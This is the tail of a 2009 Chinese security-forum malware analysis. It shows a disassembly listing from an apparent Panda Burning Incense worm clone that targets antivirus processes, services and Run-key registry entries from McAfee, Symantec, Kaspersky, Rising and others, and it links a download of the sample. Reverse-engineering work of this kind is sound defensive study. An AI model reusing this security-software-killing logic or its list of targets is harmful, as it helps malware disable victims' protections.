0041DBCA   .  E8 65F9FFFF               call    0041D534
0041DBCF   .  B8 14DE4100               mov     eax, 0041DE14                ; mcshield
0041DBD4   .  E8 5BF9FFFF               call    0041D534
0041DBD9   .  B8 28DE4100               mov     eax, 0041DE28                ; mctaskmanager
0041DBDE   .  E8 51F9FFFF               call    0041D534
0041DBE3   .  B8 38DE4100               mov     eax, 0041DE38                ; mcafeeframework
0041DBE8   .  E8 CBF9FFFF               call    0041D5B8
0041DBED   .  B8 48DE4100               mov     eax, 0041DE48                ; mcshield
0041DBF2   .  E8 C1F9FFFF               call    0041D5B8
0041DBF7   .  B8 54DE4100               mov     eax, 0041DE54                ; mctaskmanager
0041DBFC   .  E8 B7F9FFFF               call    0041D5B8
0041DC01   .  BA 6CDE4100               mov     edx, 0041DE6C                ; software\microsoft\windows\currentversion\run\mcafeeupdaterui
0041DC06   .  B8 02000080               mov     eax, 80000002
0041DC0B   .  E8 EC8CFFFF               call    004168FC
0041DC10   .  BA B4DE4100               mov     edx, 0041DEB4                ; software\microsoft\windows\currentversion\run\network associates error reporting service
0041DC15   .  B8 02000080               mov     eax, 80000002
0041DC1A   .  E8 DD8CFFFF               call    004168FC
0041DC1F   .  BA 18DF4100               mov     edx, 0041DF18                ; software\microsoft\windows\currentversion\run\shstatexe
0041DC24   .  B8 02000080               mov     eax, 80000002
0041DC29   .  E8 CE8CFFFF               call    004168FC
0041DC2E   .  B8 50DF4100               mov     eax, 0041DF50                ; navapsvc
0041DC33   .  E8 80F9FFFF               call    0041D5B8
0041DC38   .  B8 5CDF4100               mov     eax, 0041DF5C                ; wscsvc
0041DC3D   .  E8 76F9FFFF               call    0041D5B8
0041DC42   .  B8 64DF4100               mov     eax, 0041DF64                ; kpfwsvc
0041DC47   .  E8 6CF9FFFF               call    0041D5B8
0041DC4C   .  B8 6CDF4100               mov     eax, 0041DF6C                ; sndsrvc
0041DC51   .  E8 62F9FFFF               call    0041D5B8
0041DC56   .  B8 74DF4100               mov     eax, 0041DF74                ; ccproxy
0041DC5B   .  E8 58F9FFFF               call    0041D5B8
0041DC60   .  B8 7CDF4100               mov     eax, 0041DF7C                ; ccevtmgr
0041DC65   .  E8 4EF9FFFF               call    0041D5B8
0041DC6A   .  B8 88DF4100               mov     eax, 0041DF88                ; ccsetmgr
0041DC6F   .  E8 44F9FFFF               call    0041D5B8
0041DC74   .  B8 94DF4100               mov     eax, 0041DF94                ; spbbcsvc
0041DC79   .  E8 3AF9FFFF               call    0041D5B8
0041DC7E   .  B8 A0DF4100               mov     eax, 0041DFA0                ; symantec core lc
0041DC83   .  E8 30F9FFFF               call    0041D5B8
0041DC88   .  B8 B4DF4100               mov     eax, 0041DFB4                ; npfmntor
0041DC8D   .  E8 26F9FFFF               call    0041D5B8
0041DC92   .  B8 C0DF4100               mov     eax, 0041DFC0                ; mskservice
0041DC97   .  E8 1CF9FFFF               call    0041D5B8
0041DC9C   .  B8 CCDF4100               mov     eax, 0041DFCC                ; firesvc
0041DCA1   .  E8 12F9FFFF               call    0041D5B8
0041DCA6   .  B8 DCDF4100               mov     eax, 0041DFDC                ; rsccenter
0041DCAB   .  E8 84F8FFFF               call    0041D534
0041DCB0   .  B8 F0DF4100               mov     eax, 0041DFF0                ; rsravmon
0041DCB5   .  E8 7AF8FFFF               call    0041D534
0041DCBA   .  B8 28DD4100               mov     eax, 0041DD28                ; avp
0041DCBF   .  E8 70F8FFFF               call    0041D534
0041DCC4   .  B8 FCDF4100               mov     eax, 0041DFFC                ; rsccenter
0041DCC9   .  E8 EAF8FFFF               call    0041D5B8
0041DCCE   .  B8 08E04100               mov     eax, 0041E008                ; rsravmon
0041DCD3   .  E8 E0F8FFFF               call    0041D5B8
0041DCD8   .  B8 2CDD4100               mov     eax, 0041DD2C                ; avp
0041DCDD   .  E8 D6F8FFFF               call    0041D5B8
0041DCE2   .  C3                        retn
--------------------------------------------------------------------------------
```

【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!

2009 年 05 月 16 日 0:27:05

## 上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) |
| :--- |
| 山寨熊猫烧香.rar |

请到论坛下载：[`bbs.pediy.com/showthread.php?t=88974`](http://bbs.pediy.com/showthread.php?t=88974)
